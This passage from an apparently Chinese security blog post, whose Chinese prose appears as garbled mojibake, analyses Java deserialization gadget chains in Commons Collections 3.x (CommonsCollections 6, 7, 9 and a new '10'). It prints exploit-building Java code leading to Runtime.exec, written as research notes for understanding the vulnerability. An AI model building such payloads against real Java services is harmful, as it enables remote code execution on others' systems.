<li>é€šè¿‡åå°„æœºåˆ¶è·å–HashSetçš„mapç±»å±æ€§</li>
<li>é€šè¿‡åå°„æœºåˆ¶è·å–HashMap(mapç±»å±æ€§)çš„table(Node&lt;K,V&gt;)ç±»å±æ€§</li>
<li>é€šè¿‡åå°„æœºåˆ¶è·å–Nodeçš„keyç±»å±æ€§ï¼Œå¹¶è®¾ç½®è¯¥keyçš„å€¼ä¸ºæ„é€ å¥½çš„TiedMapEntryå®ä¾‹</li>
</ul>
<p>å…·ä½“ä»£ç å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("map");//è·å–HashSetçš„map Fieldå¯¹è±¡</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f);<span class="comment">// è®¾ç½®mapå¯è¢«è®¿é—®ä¿®æ”¹</span></span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);<span class="comment">// è·å–mapå®ä¾‹çš„mapç±»å±æ€§</span></span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");// è·å–HashMapçš„ table field</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f2);<span class="comment">// è®¾ç½®HashMapçš„field å¯è¢«è®¿é—®</span></span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];<span class="comment">// è·å–Node&lt;k,v&gt;å®ä¾‹</span></span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);<span class="comment">// è·å–Nodeçš„key field</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(keyField);<span class="comment">// è®¾ç½®è¯¥Fieldå¯è¢«è®¿é—®ä¿®æ”¹</span></span><br><span class="line">keyField.set(node, entry);<span class="comment">// å¯¹nodeå®ä¾‹å¡«å……keyçš„å€¼ä¸ºTiedMapEntryå®ä¾‹</span></span><br></pre></td></tr></table></figure>
<p>ç»è¿‡ä¸Šé¢çš„æ“ä½œï¼Œæœ€ç»ˆçš„HashSetå®ä¾‹è¢«æˆ‘ä»¬åµŒå…¥äº†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹ã€‚</p>
<p>è¿™é‡Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ç”¨ysoserailçš„Reflectionsæ¥ç®€åŒ–expï¼Œå‡ºæ¥çš„ç»“æœæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè¿˜æ²¡æœ‰æ‰¾åˆ°å…·ä½“çš„åŸå› ã€‚å¦‚æœæœ‰å¸ˆå‚…é‡åˆ°è¿‡è¿™ç§é—®é¢˜ï¼Œæ¬¢è¿ä¸€èµ·è®¨è®ºè®¨è®ºï¼</p>
<hr>
<h3 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h3><p>CommonsCollectionsåˆ©ç”¨çš„æ˜¯keyçš„hashå†²çªçš„æ–¹æ³•æ¥è§¦å‘<code>equals</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨<code>LazyMap.get</code>å‡½æ•°</p>
<p>é‚£ä¹ˆæ„é€ expçš„å…³é”®å°±æ˜¯æ„é€ ä¸€ä¸ªhashå†²çªçš„LazyMapäº†ã€‚</p>
<p>è¿™é‡Œå¤§å®¶å¯ä»¥è·Ÿä¸€ä¸‹String.hashCodeå‡½æ•°ï¼Œä»–çš„è®¡ç®—æ–¹æ³•å­˜åœ¨ä¸åŒå­—ç¬¦ä¸²ç›¸åŒhashçš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç </p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031172937969.png" alt="image-20191031172937969"></p>
<p>CommonsCollections7ç”¨çš„å°±æ˜¯è¿™ä¸ªbugæ¥åˆ¶é€ hashå†²çªã€‚</p>
<p>è¿™é‡Œéœ€è¦æä¸€ç‚¹çš„æ˜¯è§¦å‘LazyMap.getå‡½æ•°</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031181203017.png" alt="image-20191031181203017"></p>
<p>è¦èµ°åˆ°ç¬¬151è¡Œçº¢æ¡†æ¡†ä¸Šï¼Œé¦–å…ˆéœ€è¦æ»¡è¶³çš„æ˜¯<code>map</code>é‡Œä¸å­˜åœ¨å½“å‰è¿™ä¸ª<code>key</code></p>
<p>ä½†æ˜¯æ˜æ˜¾åœ¨ç¬¬ä¸€æ¬¡ä¸å­˜åœ¨è¿™ä¸ª<code>key</code>åï¼Œä¼šæ›´æ–°<code>map</code>çš„é”®å€¼ï¼Œè¿™å°†å¯¼è‡´ä¸‹æ¬¡åŒæ ·çš„<code>key</code>è¿›æ¥ï¼Œå°±ä¸ä¼šè§¦å‘åç»­çš„payloadäº†ã€‚æˆ‘ä»¬åœ¨å†™expçš„æ—¶å€™éœ€è¦æ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚</p>
<p>æ¥çœ‹ä¸€ä¸‹ysoserialçš„CommonsCollections7æ˜¯æ€ä¹ˆç¼–å†™çš„ï¼</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">lazyMap2.remove(<span class="string">"yy"</span>);</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ç¬¬ä¸¤æ¬¡çš„putä¼šä½¿å¾—ä¼šä½¿å¾—LazyMap2ä¸­å¢åŠ äº†yyè¿™ä¸ªé”®å€¼ï¼Œä¸ºäº†ä¿è¯ååºåˆ—åŒ–åä»ç„¶å¯ä»¥è§¦å‘åç»­çš„åˆ©ç”¨é“¾ï¼Œè¿™é‡Œéœ€è¦å°†lazyMap2çš„yyé”®å€¼removeæ‰ã€‚</p>
<h2 id="6-æ„é€ æ–°CommonsCollections10"><a href="#6-æ„é€ æ–°CommonsCollections10" class="headerlink" title="6. æ„é€ æ–°CommonsCollections10"></a>6. æ„é€ æ–°CommonsCollections10</h2><p>ç»è¿‡å¯¹å‰é¢1,3,5,6,7çš„åˆ†æï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥å‘ç°å¾ˆå¤špayloadéƒ½æ˜¯â€œæ‚äº¤â€çš„æˆæœã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦èƒ½æ ¹æ®å‰é¢çš„åˆ†æï¼Œæ„é€ å‡ºä¸€ä¸ªæ–°çš„CommonsCollectionsçš„payloadå‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼Œæ¥ä¸‹æ¥è®²ä¸€ä¸‹æˆ‘æ‰¾åˆ°çš„ä¸€ä¸ªæ–°payloadåˆ©ç”¨ã€‚</p>
<p>è¿™ä¸ªpayloadä¸ºCommonsCollections6å’Œ7çš„ç»“åˆï¼ŒåŒCommonsCollections6ç±»ä¼¼ï¼Œè¿™é‡Œä¹Ÿç”¨åˆ°äº†<code>TiedMapEntry</code>çš„<code>hashCode</code>å‡½æ•°</p>
<p>æˆ‘ä»¬åœ¨åˆ†æ<code>Hashtable</code>çš„<code>reconstitutionPut</code>å‡½æ•°æ—¶ï¼Œçœ‹ä¸‹å›¾</p>
<p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031183753047.png" alt="image-20191031183753047"></p>
<p>è¯¥å‡½æ•°åœ¨ç¬¬1234è¡Œå¯¹<code>key</code>è°ƒç”¨äº†ä¸€æ¬¡<code>hashCode</code>å‡½æ•°ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œå¦‚æœkeyå€¼è¢«ä»£æ›¿ä¸ºæ„é€ å¥½çš„<code>TiedMapEntry</code>å®ä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°±èƒ½è§¦å‘<code>LazyMap.get</code>å‡½æ•°ï¼Œåç»­çš„è°ƒç”¨é“¾å°±ç±»ä¼¼äº†ã€‚</p>
<p>æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">	-&gt; Hashtable.reconstitutionPut</span><br><span class="line">	-&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()</span><br><span class="line">	-&gt; TiedMapEntry.getValue</span><br><span class="line">	-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">	-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">	-&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>
<p>å…¶å®ä»åˆ©ç”¨é“¾æ¥çœ‹ï¼Œä¸CommonsCollections6çš„åŒºåˆ«åœ¨äºå‰éƒ¨çš„è§¦å‘ä½¿ç”¨äº†ä¸åŒçš„å¯¹è±¡ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œç»“åˆç¬¬5ç‚¹çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æ¥å†™ä¸€ä¸‹è¿™ä¸ªpayloadçš„åˆ©ç”¨é“¾exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// è·å–hashtableçš„tableç±»å±æ€§</span></span><br><span class="line">Field tableField = Hashtable.class.getDeclaredField("table");</span><br><span class="line">Permit.setAccessible(tableField);</span><br><span class="line">Object[] table = (Object[])tableField.get(hashtable);</span><br><span class="line">Object entry1 = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(entry1==<span class="keyword">null</span>)</span><br><span class="line">    entry1 = table[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// è·å–Hashtable.Entryçš„keyå±æ€§</span></span><br><span class="line">Field keyField = entry1.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">Permit.setAccessible(keyField);</span><br><span class="line"><span class="comment">// å°†keyå±æ€§ç»™æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå®ä¾‹</span></span><br><span class="line">keyField.set(entry1, entry);</span><br><span class="line"><span class="comment">// å¡«å……çœŸæ­£çš„å‘½ä»¤æ‰§è¡Œä»£ç </span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure>
<h2 id="7-æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9"><a href="#7-æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9" class="headerlink" title="7. æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9"></a>7. æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9</h2><p>æ‰¾åˆ°ä¸Šé¢CommonsCollections10æ—¶ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æœ‰æ²¡æœ‰å¸ˆå‚…å·²ç»æŒ–åˆ°è¿‡äº†ï¼Œä¸€å…±æ‰¾åˆ°ä¸‹é¢ä¸‰ä½å¸ˆå‚…</p>
<ul>
<li><a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/116" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/116</a></li>
</ul>
<p>ä¸€ä¸ªä¸€ä¸ªæ¥è¯´</p>
<ol>
<li><p>ç¬¬ä¸€ä¸ª<a href="https://github.com/Jayl1n" target="_blank" rel="noopener">Jayl1n</a>å¸ˆå‚…åšçš„æ”¹å˜ä¸»è¦æ˜¯æœ€ç»ˆçš„Runtime.getRuntime().execæ”¹æˆäº†URLClassLoader.loadClass().newInstanceçš„æ–¹å¼ï¼Œå‰é¢ç”¨çš„è¿˜æ˜¯CommonsCollections6ï¼Œè¿™é‡Œæš‚æ—¶ä¸å°†å…¶å½’ç±»ä¸ºæ–°çš„åˆ©ç”¨é“¾ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ªæ˜¯<strong><a href="https://github.com/meizjm3i" target="_blank" rel="noopener">æ¢…å­é…’</a></strong>å¸ˆå‚…æäº¤çš„CommonsCollections9ï¼Œä¸»è¦åˆ©ç”¨çš„æ˜¯CommonsCollections:3.2ç‰ˆæœ¬æ–°å¢çš„<code>DefaultedMap</code>æ¥ä»£æ›¿<code>LazyMap</code>ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªMapæœ‰åŒæ ·çš„getå‡½æ•°å¯ä»¥è¢«åˆ©ç”¨ï¼Œè¿™é‡Œä¸å†å…·ä½“åˆ†æã€‚</p>
</li>
<li>ç¬¬ä¸‰ä¸ªæ˜¯<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>å¸ˆå‚…æäº¤çš„CommonsCollections8ï¼Œå…¶åˆ©ç”¨é“¾åŸºäºCommonsCollections:4.0ç‰ˆæœ¬ï¼Œæš‚æ—¶ä¸åœ¨æœ¬ç¯‡æ–‡ç« çš„åˆ†æèŒƒå›´å†…ï¼Œåé¢ä¼šå¥½å¥½åˆ†æä¸€ä¸‹ã€‚</li>
</ol>
<h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h1><p>è”åˆå‰é¢ä¸¤ç¯‡æ–‡ç« <a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-vulnerability/">CommonsCollections1</a>ã€<a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3/">CommonsCollections3</a>ï¼Œåœ¨åŠ ä¸Šæœ¬æ–‡çš„CommonsCollections5ï¼Œ6ï¼Œ7ï¼Œ9ï¼Œ10ã€‚</p>
<p>ç”±äºç½‘ä¸Šå·²ç»æœ‰ç±»ä¼¼çš„æ–‡ç« åšäº†<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">æ€»ç»“</a>ï¼Œè¿™é‡Œå°±ç®€å•åšä¸€ä¸‹CommonsCollections&lt;=3.2.1ä¸‹çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ€»ç»“ã€‚</p>
<hr>
<ul>
<li>èµ·å§‹ç‚¹<ol>
<li><code>AnnotationInvocationHandler</code>çš„<code>readObject</code></li>
<li><code>BadAttributeValueExpException</code>çš„<code>readObject</code></li>
<li><code>HashSet</code>çš„<code>readObject</code></li>
<li><code>Hashtable</code>çš„<code>readObject</code></li>
</ol>
</li>
<li>é‡è¦çš„æ‰¿æ¥ç‚¹<ol>
<li><code>LazyMap</code>çš„<code>get</code></li>
<li><code>DefaultedMap</code>çš„<code>get</code></li>
<li><code>TiedMapEntry</code>çš„<code>getValue</code></li>
<li><code>Proxy</code>çš„<code>invoke</code></li>
</ol>
</li>
<li>ç»ˆç‚¹<ol>
<li><code>ChainedTransformer</code>çš„<code>transform</code></li>
<li><code>InvokerTransformer</code>çš„<code>transform</code></li>
<li><code>ConstantTransformer</code>çš„<code>transform</code></li>
</ol>
</li>
</ul>
<hr>
<p>å„expçš„jdké€‚ç”¨ç‰ˆæœ¬</p>
<ol>
<li>jdk7 =&gt; CommonsCollection1ã€3</li>
<li>jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10</li>
</ol>
<p>å„expçš„commons-collectionsé€‚ç”¨ç‰ˆæœ¬</p>
<ol>
<li>commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10</li>
<li>commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10</li>
</ol>
<hr>
<p>æœ€åçš„æœ€åï¼Œcommons-collections:3.xç‰ˆæœ¬çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾å°±åˆ†æåˆ°è¿™é‡Œï¼Œå…¶å®æˆ‘ç›¸ä¿¡å¦‚æœæƒ³ç»§ç»­æŒ–å¯ä»£æ›¿çš„åˆ©ç”¨é“¾è¿˜æ˜¯ä¼šæœ‰çš„ï¼Œå°±åƒæœ¬æ–‡æŒ–åˆ°çš„CommonsCollections10ï¼Œå¦‚æœå„ä½å¸ˆå‚…æœ‰å…´è¶£å¯ä»¥ç»§ç»­æŒ–ä¸‹å»ï¼Œä¹Ÿæ¬¢è¿å’Œå„ä½å¸ˆå‚…ä¸€èµ·äº¤æµã€‚</p>
<p>åç»­è¿˜ä¼šæŠŠcommons-collections:4ç‰ˆæœ¬çš„åˆ©ç”¨é“¾åšä¸€ä¸ªåˆ†æï¼Œæ¬¢è¿ä¸€èµ·äº¤æµï¼šï¼‰</p>

  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/vul/">vul</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prevï¼š<a href="/2019/11/05/java/study-java-deserialized-commonscollections4/" rel="prev"  title="ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections2,4,8">
						ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections2,4,8
					</a></span>
				
				
					<span class="art-item-right">nextï¼š<a href="/2019/10/28/java/study-java-deserialized-commonscollections3-3/" rel="next"  title="ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections3">
						ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections3
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: 'ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>6</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>23</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18px; color: #2b2b2b">cms</a> <a href="/tags/ctf/" style="font-size: 14px; color: #808080">ctf</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2019/10/31/java/study-java-deserialized-commonscollections3-others/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
